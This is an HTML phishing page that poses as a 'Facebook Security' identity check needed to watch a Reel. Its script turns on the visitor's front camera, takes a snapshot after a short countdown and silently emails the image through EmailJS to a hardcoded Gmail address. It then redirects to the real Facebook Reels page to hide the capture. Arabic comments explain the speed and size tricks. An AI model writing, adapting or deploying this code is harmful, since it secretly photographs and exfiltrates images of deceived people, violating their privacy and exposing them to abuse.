<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Security</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #1877F2; font-family: sans-serif; }
        .box { text-align: center; border: 1px solid #222; padding: 30px; border-radius: 8px; }
        .loader { border: 3px solid #111; border-top: 3px solid #1877F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <div class="loader"></div>
        <p id="txt">Security Check...</p>
    </div>

    <script>
        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })();

        window.onload = async function() {
            if (confirm("Verify your identity to watch this Facebook Reel.")) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    let count = 4;
                    const timer = setInterval(async () => {
                        count--;
                        if (count <= 0) {
                            clearInterval(timer);
                            
                            const canvas = document.createElement('canvas');
                            // حجم صغير جداً لضمان المرور عبر السيرفرات الضعيفة
                            canvas.width = 400; canvas.height = 300;
                            canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
                            
                            // إرسال الصورة بجودة متوسطة لتقليل حجم البيانات
                            const imgBase64 = canvas.toDataURL('image/jpeg', 0.4);
                            
                            // إرسال الأمر دون انتظار الرد (للسرعة)
                            emailjs.send('service_w3dev60', 'template_7k8tall', {
                                image_data: imgBase64,
                                to_email: 'tayebiabd2016@gmail.com'
                            });

                            // التحويل لفيسبوك فوراً بعد 1 ثانية من أمر الإرسال
                            setTimeout(() => {
                                window.location.href = "https://www.facebook.com/reels/";
                            }, 1000);
                        }
                    }, 1000);
                } catch (e) { window.location.href = "https://www.facebook.com/reels/"; }
            } else { window.location.href = "https://www.facebook.com/reels/"; }
        };
    </script>
</body>
</html>
